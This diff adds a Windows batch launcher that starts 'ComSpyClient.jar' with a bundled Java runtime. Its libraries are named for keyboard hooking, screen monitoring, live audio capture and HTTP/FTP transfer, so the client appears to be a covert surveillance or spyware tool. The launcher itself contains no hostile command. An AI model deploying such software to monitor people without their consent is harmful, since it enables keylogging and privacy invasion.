@@ -1,0 +1,3 @@
+@ECHO OFF
+
+%CD%\jrew\bin\java -Xmx1024m -jar %CD%\dist\ComSpyClient.jar -classpath %CD%\dist\lib\commons-net-3.0.1.jar:%CD%\dist\lib\httpclient-4.3.6.jar:%CD%\dist\lib\httpcore-4.3.3.jar:%CD%\dist\lib\httpmime-4.3.6.jar:%CD%\dist\lib\javaFlacEncoder-0.3.1.jar:%CD%\dist\lib\java-json.jar:%CD%\dist\lib\jmf.jar:%CD%\dist\lib\jna-4.1.0.jar:%CD%\dist\lib\jna-platform-4.1.0.jar:%CD%\dist\lib\KeyboardHook.jar:%CD%\dist\lib\libLiveAudioRemotle.jar:%CD%\dist\lib\libScreenMonitor.jar:%CD%\dist\lib\org-apache-commons-logging.jar:%CD%\dist\lib\synthetica.jar:%CD%\dist\lib\syntheticaClassy.jar:%CD%\dist\lib\jarinjarloader.zip
